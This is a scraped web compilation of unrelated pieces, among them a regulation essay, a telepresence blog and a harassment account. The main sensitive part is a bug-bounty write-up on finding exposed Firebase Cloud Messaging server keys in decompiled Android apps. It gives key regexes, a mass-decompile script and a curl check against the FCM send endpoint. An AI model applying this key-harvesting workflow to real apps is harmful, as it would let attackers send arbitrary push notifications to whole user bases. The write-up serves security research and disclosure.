stuff most of the time, just a small group of reckless individuals is enough to cause disaster.</p>

<p>That’s where regulation comes in. Regulation basically says: “Hey, this one company screwed up big time
recently, so from now on, every company has to comply with this list of things we came up with. Those measures
will surely prevent that from happening again!”.</p>

<p>And that sucks. Because what did we do? We took the maximum observed stupidity of our society (writing buggy
code that emits radiation) and now we <em>assume</em> that 1) everyone else is just as stupid and 2) that some rules
we came up with will prevent the problem in the future.</p>

<p>Let’s think about these assumptions.</p>

<h3 id="1-can-we-assume-everyone-to-be-stupid">1) Can We Assume Everyone to Be Stupid?</h3>

<p>Does it really sound like a good approach to subject everyone to the same standards? Standards which were
created based on the most incapable person, the <em>most-stupid-denominator</em>?</p>

<p>This reminds me of working at the office (good times). In any company, there are always some people who are
more messy than others. Or should we rather say: Less diligent. While you’re trying to write code, they have
loud phone calls on speakerphone. They enter your meeting room and don’t close the door. Sometimes they
“forget” to use the toilet brush after deploying a large payload.</p>

<p>Now, how do you deal with these problems? You have two options:</p>

<p>You talk to those people individually. This is not only the most discreet, but also the most effective
way. It’s also the hardest. At least for you: It takes courage to approach that person and deliver that sort
of message. But it’s the right thing to do.</p>

<p>The other option would be: You attempt to <em>generalize</em> the problem and solve it <em>generically</em> by establishing
new company policies. You put up a sign in the open office saying “No loud phones calls!”. On all meeting room
doors, you write “Please close the door”. And in each bathroom, you hang up a framed SOP for when to use the
toilet brush.</p>

<p>This is how large companies deal with those problems, and companies in which people don’t have the guts to
talk about problems one on one. It’s a cowardly and ineffective move. Guess what - the dude who has loud phone
calls will most likely not read a random sign on the wall. And all other people who were behaving perfectly
fine are now subjected to a barrage of useless signs which assume they’re utterly incompetent at breathing.</p>

<p>Unfortunately, regulation tries to solve problems in the same way.</p>

<p>Developers are expected to create hundreds of pages of documentation to prove that they’ve really tested
everything. They must write a development plan to ensure that they’re actually capable of developing whatever
they wanted to build (?). They have to make a list of their dependencies and test them (!).</p>

<p>If your development team is incompetent, forcing them to write a development plan won’t increase their code
quality. It only increases overhead.</p>

<p>Funnily enough, the same incompetent developers will pass all regulatory hurdles as long as they’re creating
the right documentation. A scary thought. Which leads me to the next question:</p>

<h3 id="2-will-our-rules-prevent-the-problem">2) Will Our Rules Prevent the Problem?</h3>

<p>Anyone who has ever observed complex systems knows: It’s hard to come up with interventions which actually
provide the desired outcome.</p>

<p>Say, your garden has snakes. You don’t like that because you want to sit on your patio and you’re scared of
snakes. So you put a honey badger there to chase away the snakes. Great, the snakes are gone. But now the
honey badger is settling down on your patio and has invited all his honey badger friends to hang out
there. Bad luck for you. A second order effect!</p>

<p>Is developing (medical) software a complex process? And, if so, can regulation be compared to a honey badger?
I think so.</p>

<p>We are introducing measures which we <em>assume</em> will improve things, because they were <em>associated</em> with certain
problems in the past. But in reality we don’t know if they were <em>causing</em> them. We just mixed up correlation
and causation.</p>

<p>It’s like observing people with Covid and saying “Aha! Those Covid patients are coughing! So let’s tell all
healthy people not to cough and they’ll be fine!”. Luckily our standards of medical science are better than
that. New treatments have to undergo clinical trials in which they must show an improvement in patient
outcome. Do our regulatory measures undergo similar testing? I’m not sure.</p>

<p>But one things <em>will</em> happen for sure: The list of hoops all future companies have to jump through just became
longer. And guess what? The useful time they can spend on developing their product has shrunk, again.</p>

<p>But here’s the worst part. After we’ve introduced our measures, software actually became safer. That leads us
to wrongly assume that <em>we chose the right measures</em> and <em>those measures caused improvements in safety</em>. But I
don’t think that’s true. Sure, we achieved our goal, but we don’t know <em>how</em>. Sounds like alchemy! A dangerous
situation.</p>

<p>I call these <em>second order effects of regulation</em>.</p>

<h2 id="second-order-effects">Second Order Effects?</h2>

<p>Do our regulatory measures <em>cause</em> us to develop safer software? Or are we kicking off second-order effects
and just accomplishing our goals by coincidence?</p>

<p>Let’s look at the facts.</p>

<p>Building medical software has tons of additional overhead. This leads to slower development, additional hires
and more audits. What do companies need when development slows down, head count increases and auditors knock
on your door? Right - more money.</p>

<p>We’re severely limiting the number of companies who can enter the market by raising the bar of funding
required.</p>

<p>What are the consequences?</p>

<p>Only companies with a lot of funding (and time) are able to enter the market. A two-person startup can’t
afford to hire expensive staff for regulatory compliance. And they sure as hell can’t afford to put countless
man-hours into documenting regulatory-compliant processes! What sort of processes do you need in a two-person
startup, anyway?</p>

<p>So: We’ve successfully prevented small startups from entering the market.</p>

<p>What’s the main difference between small startups and large companies? Small startups develop products which
solve existing problems in a novel way. They accomplish this through innovation which others deemed
infeasible, or too <em>risky</em>, or both.</p>

<p><em>Risky</em>. That’s the difference.</p>

<p>GE, Philips, Siemens - do you expect those enterprises to ship a <em>risky</em>, groundbreaking Machine Learning -
based Radiology software which radically automates radiology assessments? Hell no. You can hardly expect them
to ship any features at all. They’re too scared of changing things. They’re scared of things going wrong,
their public image taking a hit and losing their existing customers. They are <em>risk-averse</em>.</p>

<p>So, yes, our medical software has become safer, but not due to our regulatory requirements. Rather because
we’ve created a heavy selection bias of only allowing large, well-funded, risk-averse companies to enter the
market.</p>

<p>We achieved safety at the cost of killing innovation. Flying an airplane, we would say: Great landing, wrong
airport.</p>

<h2 id="a-decision-we-have-to-make">A Decision We Have to Make</h2>

<p>Nowadays, the daring two-person startup can no longer enter the market and reach patients. That’s where
innovation would have happened.</p>

<p>Is that a bad thing? Well, it depends.</p>

<p>Safety and progress are often on opposing ends of a spectrum - in most cases, you can’t have both. We, as a
society, have chosen to heavily favor safety over progress. Better keep things the way they are, because new
things can go wrong. And that’s a fair decision to make.</p>

<p>But I think we’re making the wrong decision. Because most of us are blind to the opportunity cost of <em>not
innovating</em>. We don’t see what would have happened to patients if we had had better software.</p>

<p>While I was working in the hospital, I would regularly be involved in admitting new patients. You won’t
believe how often they didn’t have an up-to-date list of their medication. I’d have to call their GP and
request their medication list to be <em>faxed</em>, if I could reach the GP at all. This process was slow and
error-prone.</p>

<p>Consider: If you’re hit by a car and wheeled into the ER, do you want your medication list to be unavailable
because your GP is unreachable? Do you want your patient history to be lost because it’s on paper, stashed
away in some drawer? Do you want to be exposed to additional radiation for imaging because your old images
are on a CD at your parents place?</p>

<p>Just how many …</p></article></div></div>

<p>
  <b>tiny-curl is curl for smaller systems</b>.
  </p><ul>
    <li> focused on providing a library for HTTP(S) GET
    </li><li> provides the familiar and known libcurl API
    </li><li> targets RTOSes and systems "too small to run regular Linux"
    </li><li> provides ports to RTOSes that "real curl" don't support
    </li><li> GPLv3 licensed
  </li></ul>
<p>
  All features that tiny-curl disables by default are possible to enable,
  piecemeal, but might increase footprint and memory requirements.
</p><p>
  As many as possible of the mechanisms that are done to shrink the footprint
  for tiny-curl are backported and merged into real curl.
</p><h2> Size requirements </h2>
<p>
  The goal of tiny-curl is to offer HTTPS GET powers within <b>100K of storage
  size</b> (on a 32 bit system), and that includes wolfSSL.
</p><p>
  tiny-curl itself requires about <b>20K of dynamic memory</b> (but using more
  may speed up transfers).
</p><h2> License </h2>
<p>
  tiny-curl is licensed under GPLv3. Note that this is different than the
  regular curl, which is MIT licensed.
</p><p>
  You can also get <a href="https://www.wolfssl.com/contact/">tiny-curl under
  a commercial license from wolfSSL</a>.

It was only slightly concerning at first, until I realized that 40+ people were posting, commenting, and emoji reacting.</p><p><span>

    </span></p><p><undefined>Here are a few examples. The most irritating ones used tech jargon ("fixing bloat") to mask their pathetic actions. As a bystander, you might not realize until viewing the proposed changes... and seeing all content deleted. This is also the most irritating because there is no obviously hateful or violent content, and can be written off as "just a joke." <span role="img" aria-label="face with rolling eyes">🙄</span></undefined></p><p>This is a specific type of trolling I was experiencing, called "dogpiling":</p><blockquote><p>Dogpiling: When a group of trolls works together to overwhelm a target through a barrage of disingenuous questions, threats, slurs, insults, and other tactics meant to shame, silence, discredit, or drive a target offline. — <a href="https://onlineharassmentfieldmanual.pen.org/defining-online-harassment-a-glossary-of-terms/">PEN America</a></p></blockquote><p>This is not a new tactic used to silence, but it was the first time I've personally experienced it. Good thing I designed a lot of our moderation tools and have talked about the <a href="https://youtu.be/5CSQYMOWOtQ?t=580">taxonomy of online abuse</a> before, and recognized this type of harassment quickly. I was able to get help from amazing coworkers, <a href="https://twitter.com/cheshire137">Sarah Vessels</a> and <a href="https://twitter.com/deniseyu21">Denise Yu</a>, to query my repo's referral data. The traffic was coming from 4chan... two 4chan threads totaling nearly 500 disturbing comments.</p><p>Seeing this shit was absolutely surreal. The GitHub content was annoying, but this made me feel sick. I still remember the feeling of being so overwhelmed and just sobbing at my desk. Reading disgusting, racist, sexist comments about me. Seeing screenshots of my face plastered across the threads. Understanding the exact moment where the dogpiling was coordinated. Realizing this was likely to keep happening (and it did).</p><p>And what still really creeps me out is that these people felt so emboldened to troll an EMPLOYEE using their actual GitHub accounts with legitimate work and contributions. <u>These harassers are everyday software engineers.</u></p><p>I'm not famous and I don't have a very large platform, so why me?</p><p>Upon reading the threads, there were some pretty clear reasons why this happened to me. I'll dig deeply into each one. <em>HUGE shoutout to my kat-ops counterpart <a href="https://twitter.com/pifafu">Kathy Zheng</a> for helping me compile screenshots!</em></p><h2>I'm a woman.</h2><p><undefined>Well, this was the most obvious reason. Women disproportionately experience online harassment, and very much so for sexual harassment. I included a few snippets but won't spend too much time on this one because it was some boring, basic bitch shit that we've all seen before <span role="img" aria-label="">🤷🏻‍♀️</span></undefined></p><p><span>

    </span></p><p>That wasn't every screenshot from the threads, but is a good summary. The sheer volume of comments was definitely one of the more overwhelming aspects of this fuckery. Thanks for reading along this far.</p><h2>So if it wasn't clear:</h2><p><undefined>I was targeted by racist techies because of my background and visibility in order to be silenced and driven out of this industry. <span role="img" aria-label="middle finger">🖕</span></undefined></p><p>It was particularly cruel to harass me on the platform I work on everyday, where I design for open source communities. I couldn't focus at work and ended up taking two weeks off. This experience has really impacted the way I view tech and my place in it—but I'll save that for another post. </p><p>I've already accepted that this won't be my last brush with online harassment, so long as I'm still a visible Asian woman in tech. And this is going to continue happening to me and less privileged tech workers for just existing and being successful. All we can do is protect and support each other, because it's not our job to fix this problem.</p><p>It's your move next, tech. Here are my suggestions, you can have them for free:  </p><h2>To the most privileged tech leaders:</h2><p>When these events happen to your employees, are you investing actual money to support them? Are you monitoring content, encouraging time off, creating company policies, and covering their therapy? In lucky cases like mine, where the bulk of harassment may happen on the platform the victim works on, are you actively fixing pain points your employee experienced? Make sure you have a policy and detailed playbook, and definitely don't expect your marginalized employees to fix these problems for you. Don't wait until an incident arises—<strong>it's always an "edge case" until someone's personal safety is threatened.</strong></p><p>By not having intentional protections for the most vulnerable in place, you're preventing employees from being productive at work (because they're dealing with bullshit!). And you're absolutely driving away diverse talent from joining your company. It's actually fucking up your business. Access and representation in tech isn't a pipeline or qualification problem. <strong>It's a white supremacy problem.</strong></p><blockquote><p>And what still really creeps me out is that these people felt so emboldened to troll an EMPLOYEE using their actual GitHub accounts with legitimate work and contributions. <u>These harassers are everyday software engineers.</u></p></blockquote><p>Lastly, I want to circle back to this point about users with legitimate coding work harassing me. It's easy to dismiss these trolls as incel 4channers that we shun and don't associate with. Lol no. These are your people. They work at your companies and write your code. They are harassing or doxxing your other employees. This toxic behavior is still very much a part of your tech culture, and you keep rewarding it.</p><p>Fix. This. Shit.</p></article></div>]]>

<p>We like experimenting with geeky tools. All in the name of science of course…</p>



<p>How about sitting on a beach in Thailand and participating in conference in Stockholm by remote-controlling an ipad on a stick on wheels? Sounds like a fun experiment, doesn’t it? How many geek points is that?</p>



<figure><img src="https://hkniberg.files.wordpress.com/2013/12/henriks-double2.jpg?w=390&amp;h=520" alt="Image" title="Ipad on a stick on wheels"></figure>



<p>And hey, I just happen to be on an island in Thailand right now, and there’s this cool event&nbsp;<a href="http://leantribe.org/ltg-18/">Lean Tribe Gathering</a>&nbsp;happening at the Spotify Stockholm office, and I recently bought a&nbsp;<a href="http://www.doublerobotics.com/">double</a>. I saw one of those things driving around the office a few months ago, and it instantly popped to the top of my must-try-someday list.</p>



<p>So what was the hypothesis? I’ve heard that it’s only an experiment if you have a hypothesis. Otherwise it’s just playing around, and I wouldn’t want to be accused of that would I?</p>



<p>The conference was an evening of lightning talks and open space (= big room with lots of mingling and small groups of informal conversations, like a cocktail party under the guise of a conference). Will I hear and see the presentations? Will I be able to roll around and freely participate in the open space? Will I feel like I’m&nbsp;<em>really</em>&nbsp;<em>there</em>?</p>



<p>So my hypothesis was: “I can fully participate in this conference using a double”.</p>



<p>So how did it work out?</p>



<figure><img src="https://i0.wp.com/hkniberg.wordpress.com/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif" alt="" title="More..."></figure>



<p>It worked! The hypothesis was falsified, unfortunately, but it was still really cool! I sat on the beach near a restaurant with good connectivity, pulled out my ipad, logged on to my double in Stockholm, and started driving around and talking to people. Geek heaven!<img loading="lazy" src="https://hkniberg.files.wordpress.com/2013/12/on-the-beach2.jpg?w=650&amp;h=414" alt="Image" width="650" height="414">Alone on a dark beach because it got rather late. +6 hrs time difference.</p>



<p>I was totally impressed, but also slightly disappointed, at the same time. Impressed that I felt truly present at the conference, but slightly disappointed that I felt more like an observer &amp; comic relief than a real participant.</p>



<p><strong>Watching the lightning talks</strong></p>



<p>The controls were a bit clumsy, and my internet connection was a bit shaky. But I could get around fine, slowly, and I was able to make it to the front of the room right by the stage.</p>



<p>For the lightning talks I could see and hear the speakers fine (they had mics), and I could make out about half of the slides (depending on colors used, font size, etc). All in all I got the presenter’s message. But I didn’t need a double for that, someone could have put a laptop on a chair and connected me via skype/hangout. On the other hand, it was nice to be able to “turn my head” from time to time, to follow the speaker’s movements, or see the audience and the room.</p>



<p><strong>Mingling in the open space</strong></p>



<p>The open space part was really fascinating. Driving around this… thing…. and feeling like I’m really there. Weird.</p>



<p>However, although it was fun and cool, in practice it didn’t really work that well because of the background chatter. I could roll up to a group of people, but I could only pick out about 20% of what was being said, because of all the other discussion happening around me. Also, the ipad speakers are too weak for this kind of situation, people could only hear me speak if they bent down and put their head really close. So I felt more like an observer than a participant.</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/my-ipad.jpg"><img src="https://hkniberg.files.wordpress.com/2013/12/my-ipad.jpg?w=468&amp;h=611" alt="Image"></a></figure>



<p>At one point I joined a smaller group (4 people) sitting a bit further off, away from the main chatter.&nbsp; That worked perfectly, I could join the group and really be part of the conversation.</p>



<p><strong>REAL telepresence</strong></p>



<p>The cool thing is that I was really there. I mean that thing rolling around was ME! On one hand I was like “wow, awesome, I teleported to Stockholm and shapeshifted along the way!”. A true out-of-body experience. On the other I hand I was like “HELP! I’m stuck inside this thing! My body has become and ipad on a stick on wheels!”.</p>



<p>I had the distinct sensation of “Wow, so this is what it’s like being a drunk&nbsp;<a href="http://en.wikipedia.org/wiki/Tetraplegia">tetraplegic</a>&nbsp;with bad hearing and a weak voice.”</p>



<p>Tetraplegic, because I’m effectively paralyzed from the neck down – the double doesn’t even have legs or arms. I could see and hear, and I could roll around like in a wheelchair. But slowly and carefully, and I sometimes needed assistance when things got in the way. Sometimes I got assistance, even when I didn’t need it, which felt both good and bad at the same time. Gradually people noticed that I could get around quite nicely myself, with some patience. I can’t turn my head, but I can turn my whole vehicle from side to side to see what’s going on. Of course, I don’t know what it’s really like to be a tetraplegic but I guess it’s probably something like this.</p>



<p>Drunk, because that thing sways quite often to stay in balance, and sometimes bumps into things or trips on small objects and falls flat on it’s face (happened only once, but it felt horrible).</p>



<p>Bad hearing and weak voice, because of the background noise in combination with my rather limited microphone and speaker. I often couldn’t follow the conversation going on, and people had to lean in close to hear what I was saying.</p>



<p>Another interesting thing. Sometimes when I rolled up to a group of people, they stopped talking and stared at me instead. As if I was some kind of object (and maybe I was…. or maybe not? Any philosophers out there?). Lots of smiles and laughs of course, and the occasional shocked surprised as someone realized that “hey, there’s a person inside that thing!”. In some cases I felt more like a comic relief than a true conference participant. While listening in on a conversation (well, trying…) I sometimes noticed people staring at me, and they couldn’t see that I was staring right back at them. A weird feeling of eye contact and, well, not.</p>



<p>Although, I admit, it was quite fun to sometimes bump into people and see them shriek in surprise at being accosted by an ipad on a stick on wheels, with a grinning guy on the screen. Even earned me a kiss on the cheek once. Or at least that’s what I&nbsp;<em>think</em>&nbsp;she was doing. It wasn’t a slap at least, I don’t think.</p>



<p>I asked one guy for some coffee, and he almost did, until he realized what he was talking to :o)</p>



<p><strong>Running out of batteries</strong></p>



<p>Unfortunately the ipad on the double wasn’t fully charged from start, so it started running low quite quickly. I didn’t want to disrupt the ongoing presentation, so I tweeted for help, and someone kindly plugged me in.</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/need-batteries.jpg"><img src="https://hkniberg.files.wordpress.com/2013/12/need-batteries.jpg?w=562&amp;h=499" alt="Image"></a></figure>



<p>During a break, I logged off to make it charge faster (which it didn’t). Then later, when logging in again, I found myself standing a few meters away from the nearest person. I wanted to be unplugged so I could move around! Heeeeelp! but nobody could hear me! Now what? I guess I could tweet again, but it might take a while for someone to react.</p>



<p>Ah, I could display a message on my screen! But how? The app on my end will only send the video stream, i.e. my face on the camera. I can’t get it to display something else. Ah, I could write a note! But darn, I’m sitting on a beach in Thailand and no paper or pen nearby.</p>



<p>Then I realized that I had my laptop with me (as backup solution). So I fired up textedit and wrote a message</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/unplug-me.png"><img src="https://hkniberg.files.wordpress.com/2013/12/unplug-me.png?w=256&amp;h=224" alt="Image"></a></figure>



<p>I made the font huge (as in covering the whole screen), and pointed my ipad cam at it. And moved it back and forth a bit for effect (causing the text to pulsate). That worked! People at the conference saw the message quickly and unplugged me.</p>



<p>The charger didn’t work though, so I was still at about 10%. I figured I’d just participate as long as I could, and the battery would die when it died. That was also a weird feeling, knowing that at any moment I will “die”, my double will go limp, and I’ll suddenly wake up back on the beach in Thailand. Total Matrix moment! I saw the battery counter go lower and lower, and my minutes were numbered, so I had to make the most of it. Carpe Minutus! Seize the minute!</p>



<p><strong>Conclusions</strong></p>



<ul><li>Double is a supercool and practical gadget, looks nice and takes very little space.</li><li>Watching a presentation works</li><li>Having conversations in small groups works, but not if there’s other conversations happening nearby.</li><li>Moving around works, but slowly, and not with big thresholds or stairs.</li></ul>



<p>Features I would love to have:</p>



<ul><li>the ability to “tilt my head” upwards a bit. I could look down at my wheel via a nifty fold-down mirror (great for navigating around chairs and such), but I couldn’t look up, and the robot is rather short even when fully extended, so often I found myself involuntarily staring at someone’s chest as they talked to me. A bit awkward, especially with girls….)</li><li>the ability to display a message or sketch, not just my videocam &amp; face all the time.</li><li>the ability to plug myself in for charging, like the docking pads that lawnmower robots use.</li><li>a louder speaker, for noisy environments</li><li>a directional mic that can be activated/deactivated, in cases where I want to hear the person in front of me and ignore the background noise.</li></ul>



<p>Oh, and If you’re going to sit on a beach in Thailand in the middle of the night, make sure you have mosquito repellant. And don’t forget the hands! I have like 30 mosquito bites on my hands, I’ll probably get dengue fever or something. But heck, sometimes you have to make sacrifices for science!</p>

<h2 id="tldr">TL;DR</h2>
<p>A malicous attacker could control the content of push notifications to any application that runs the FCM SDK and has it’s FCM server key exposed &amp; at the same time send these notifications to every single user of the vulnerable application!</p>
<p>These notifications could contain anything the attacker wants including graphic/disturbing images(via the <code>"image": "url-to-image"</code> attribute) accompanied with any demeaning or politically inclined message in the notification!</p>
<hr>
<p>The beginning of this year has seen a lot of <a href="https://twitter.com/search?q=%23androidhackingmonth&amp;src=typed_query">#AndroidHackingMonth</a> tweets popup which led to some pretty good disclosures showing different techniques and tricks with respect to android application hacking.

<h2 id="gathering-a-dataset-of-decompiled-apks">Gathering a dataset of Decompiled APKs</h2>
<p>After rammaging through a dozen blogs on how to begin with hacking android applications and reading them to the best of my abilities, I decided to initially start with looking for secrets in an android application.</p>
<p>This meant decompiling an android apk and just grepping for some know patterns within the <code>strings.xml</code> file as that’s usually where secrets can be found and also the decompiled <code>.smali</code> files for “secret declaration” within the code i.e mediocre static code analysis. Sounds like a good first step!</p>
<p>I started downloading apks of some public and private programs from <a href="https://hackerone.com/">Hackerone</a> and <a href="https://bugcrowd.com/">Bugcrowd</a> so as to collect an initial dataset and then go in looking for secrets all together.</p>
<p>I was able to achieve this by the help of <a href="https://github.com/defparam/h1passets">h1passets</a>. I also sent in a mediocre <a href="https://github.com/defparam/h1passets/pull/2">PR</a> to collect all the package ids of the apks of Hackerone’s private programs. I then scraped a few package ids of public programs of HackerOne and Bugcrowd from <a href="https://github.com/arkadiyt/bounty-targets-data">bounty-targets-data</a>.</p>
<p>Once the package ids were collected, I took some time out to download them from <a href="https://apkcombo.com/">apkcombo</a>. After having close to 50-70 apks downloaded into a single folder, I began mass decompiling these apks using <a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">apktool.jar</a>.</p>
<p>I did this with a simple bash script shown below</p>
<div><pre><code data-lang="bash"><span>#!/bin/bash
</span><span></span>
<span>for</span> file in *.apk
<span>do</span>
java -jar ~/APK_Research/apktool.jar d <span>$file</span> -o decompiled_apks/<span>$file</span>/
<span>done</span>
</code></pre></div><p>So now I had a credible sized dataset of decompiled apks to work with!</p>
<hr>
<h2 id="variable-names-have-it-all">Variable names have it all</h2>
<p>After hooking up <a href="https://github.com/tomnomnom/gf">gf</a> (A wrapper around grep) with a modified version of regex patterns from <a href="https://github.com/xyele/zile">Zile</a> (i remeber this was named something else initially), I began a simple gf grep through the decompiled apks directory to see if I could spot some secrets right away and report them.</p>
<p>I used my vps to run overnight gf greps from the Decompiled_apks folder and saved those results in separate files for further analysis. These saved files contain the API key/secret, their location and also their variable name.</p>
<p>Come the next day, I looked up most of the files and found pretty much nothing, just a bunch of SDK keys which were meant to be public, API keys with limited scope etc.</p>
<p>It was time to look into the <code>gcp_keys.txt</code> that contained the google cloud project (GCP) API keys. I knew they would usually contain API keys for Google Maps Or Google Crash Reporting API which had no impact.</p>
<p>But it was common knowledge that GCP keys could be multi-privileged i.e  the same key could be utilized for different enabled API’s!</p>
<p>So I began looking into the <code>gcp_keys.txt</code> file but with more focus on the variable names. Variable names can sometimes provide a lot of information about the privilege of the key. Here’s a rough snippet of the variable names I encountered inside the <code>gcp_keys.txt</code>:</p>
<div><pre><code data-lang="xml">apk-1/AndroidManifest.xml: <span>&lt;meta-data</span> android:name=<span>"server_key"</span> android:value=<span>"AIzaSyB[REDACTED]"</span><span>/&gt;</span>
apk-3/trx.smali:    const-string v1, "AIzaSyQ[REDACTED]"
apk-5/AndroidManifest.xml: <span>&lt;meta-data</span> android:name=<span>"com.google.android.geo.API_KEY"</span> android:value=<span>"AIzaSy[REDACTED]"</span><span>/&gt;</span>
apk-8/res/values/strings.xml: <span>&lt;string</span> name=<span>"google_maps_geocoder_key"</span><span>&gt;</span>AIzaSyl[REDACTED]<span>&lt;/string&gt;</span>
apk-2/res/values/strings.xml: <span>&lt;string</span> name=<span>"notification_server_key"</span><span>&gt;</span>AIzaSyl[REDACTED]<span>&lt;/string&gt;</span>
apk-4/AndroidManifest.xml: <span>&lt;meta-data</span> android:name=<span>"com.google.android.maps.v2.API_KEY"</span> android:value=<span>"AIzaSy[REDACTED]"</span><span>/&gt;</span>
</code></pre></div><p>So from the file, I was able to extract the below list of <em>as I call it</em> potential variable names.</p>
<p>google_maps_geocoder_key, notification_server_key, google_notification_key, app_api_key, googlePlacesWebApi, server_key … etc</p>
<p>I felt these keys were capable of something more! I started looking for articles/blogs containing similar variable names in order to conclude what exactly the key does.</p>
<p>Both <code>server_key</code> and <code>notification_server_key</code> led me to <a href="https://firebase.google.com/docs/cloud-messaging/server">Firebase Cloud Messaging / FCM</a></p>
<hr>
<h2 id="the-fcm-server-key---reading-docs-and-validation-of-the-key">The FCM Server Key - Reading docs and validation of the key</h2>
<p>After visiting <a href="https://firebase.google.com/docs/cloud-messaging/server">Firebase Cloud Messaging / FCM</a> ,i understood that the keys grepped could somehow be linked to cloud messaging aka push notification services. I was yet to find an article that explained everything, so I started digging again.</p>
<p>From the docs I got a gyst of a few things.</p>
<ul>
<li>There’s a server environment which deals with <strong>Send Requests</strong> i.e authorized requests that enforce push notifications</li>
<li>There’s a client FCM SDK that takes care of generating IID tokens that identifies an app instance on a device uniquely.</li>
</ul>
<p>Possibilities with the keys at hand? I either could have a key that has some role in the server environment or a client-end SDK key which was already meant to be public.</p>
<p>I focused on the server environment and came across the <a href="https://firebase.google.com/docs/cloud-messaging/migrate-v1">Legacy to HTTP v1 server protocol migration guide</a> . This article recommended migrating from a <a href="https://firebase.google.com/docs/cloud-messaging/http-server-ref">Legacy HTTP protocol</a> to the modern HTTP v1.</p>
<p>But as you see, It also shows how the <code>AizaSy</code> keys can be used as authorization keys under the <a href="https://firebase.google.com/docs/cloud-messaging/migrate-v1#update-authorization-of-send-requests">before section</a>, the same is shown in the image below</p>
<p><img src="https://abss.me/posts/fcm-takeover/aizasy.png" alt="FCM Authorization done via AizasY" title="FCM Authorization"></p>
<p>From this,  I figured the <code>AizaSy</code> keys are used for authorization of <strong>Send Requests</strong> via the Legacy HTTP protocol. This meant sending push notifications of my choice via the legacy HTTP protocol.</p>
<p>We cannot use the modern HTTP v1 protocol as it is based on the oauth2.0  security model. This makes use of bearer tokens of service accounts.</p>
<p>So reading the docs <a href="https://firebase.google.com/docs/cloud-messaging/auth-server#authorize-http-requests">here</a> under the legacy http protocol, I found a simple <code>curl</code> to validate the key.</p>
<div><pre><code data-lang="bash"><span>api_key</span><span>=</span>YOUR_SERVER_KEY

curl --header <span>"Authorization: key=</span><span>$api_key</span><span>"</span> <span>\
</span><span></span>     --header Content-Type:<span>"application/json"</span> <span>\
</span><span></span>     https://fcm.googleapis.com/fcm/send <span>\
</span><span></span>     -d <span>"{\"registration_ids\":[\"ABC\"]}"</span>
</code></pre></div><p>If the above curl returns a <code>200 OK</code> response status code then the key is legit. Anything other than <code>200 OK</code> and the key is invalid. Testing this on one of the suspected keys showed a <code>200 OK</code> response status code!</p>
<p>I knew how to validate the key and also the purpose of the key.</p>
<p>To sum things up, here is an overview of the FCM Architecture</p>
<p><img src="https://abss.me/posts/fcm-takeover/fcm-workings.png" alt="FCM Architecture"></p>
<hr>
<h2 id="discovering-key-variations">Discovering Key Variations</h2>
<p>As I was reading the forementioned <a href="https://firebase.google.com/docs/cloud-messaging/auth-server#authorize-http-requests">article</a> on authorizing legacy HTTP requests, I followed the first instruction that said to visit the <a href="https://console.firebase.google.com/project/_/settings/cloudmessaging/">Cloud Messaging tab</a> of the firebase project in order to locate the FCM server key <code>AizaSy</code> and there I found another variation of the key!</p>
<p>The image below shows both variations of a FCM server key.</p>
<p><img src="https://abss.me/posts/fcm-takeover/fcm_keys.png" alt="FCM Keys" title="FCM Authorization"></p>
<p>The FCM server key of regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code> is similar to the Legacy Server key i.e both are project credentials having authority over sending authorized send requests to all FCM SDK enabled applications under the firebase project. This key type is recommended to be used as per the docs.</p>
<p>Later on, my search for various blogs regarding the GCM( Google Cloud Messaging ) to FCM migration I noticed there is also the possibility of a gcp key to exist with formerly gcm permissions as seen <a href="https://www.izooto.com/blog/generate-gcm-sender-id-server-api-key">here</a>.</p>
<p>GCM has been long deprecated but due to migration and to stop any regressions, such keys were still valid for the new FCM endpoints! This is the final variation of the FCM server key.</p>
<p>So we have 3 types of FCM server keys :</p>
<ul>
<li>A FCM server key of regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code></li>
<li>A Legacy FCM server Key of regEx <code>AIzaSy[0-9A-Za-z_-]{33}</code>. This gets automatically added to your GCP project.</li>
<li>A GCP key with FCM privileges of the same regEx as above <code>AIzaSy[0-9A-Za-z_-]{33}</code>. In This variation, the key is createdunder a GCP project and then provided the essential privileges.</li>
</ul>
<p>As of now the Legacy Server Key has been deprectaed, so any forthcoming firebase project will not contain Legacy Server Keys anymore :</p>
<p><img src="https://abss.me/posts/fcm-takeover/deprecated_legacy_server-key.png" alt="Deprecated Legacy Server Key" title="FCM Authorization"></p>
<p>But if found, they are still valid! (again to prevent any backlogs and regressions!)</p>
<p>I quickly added the new regEx <code>AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}</code> to my gf profile and began another round of grep through the decompiled apk dataset and validated them!</p>
<p>Below is the combined gf profile for all key variations</p>
<div><pre><code data-lang="json">{
    <span>"flags"</span>: <span>"-oEarHn"</span>,
    <span>"patterns"</span>: [

     <span>"AIzaSy[0-9A-Za-z_-]{33}"</span>,
     <span>"AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}"</span>
 ]
}
</code></pre></div><p>More hits followed!</p>
<p>After grepping for the keys, I wrote a simple validation script that places all conforming FCM keys into a single txt file</p>
<div><pre><code data-lang="bash">
<span>#!/bin/bash</span>
<span>while</span> <span>read</span> -r key
<span>do</span>

<span>if</span> <span>[</span> <span>"</span><span>$code</span><span>"</span> <span>==</span> <span>"200"</span> <span>]</span>
<span>then</span>
<span>echo</span> <span>"[*]       Key is </span><span>$key</span><span>"</span>
<span>echo</span> <span>"</span><span>$key</span><span>"</span> &gt;&gt; valid_keys.txt
<span>fi</span>

<span>#gcp_keys.txt has the all the grepped keys, both AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140} and AIzaSy[0-9A-Za-z_-]{33}</span>
<span>done</span>&lt;<span>"/gcp_keys.txt"</span>

<span>#eliminate duplicates</span>
sort -u -o valid_keys.txt valid_keys.txt

  <div itemprop="articleBody">
    <p>Computer Programming can be hard , can be complex to understand for some people, but that doesn’t mean that they can’t be fun. From the beginning , programming languages were in English , well most of them except some special languages. But I have designed a programming language which let’s people program in Cats’ language, Mew Mew Mew. Which despite being a esoteric language is very much usable , and let’s programmers create complex program. I
also have conducted a small study to find real world use cases of MewMew programming language.</p>



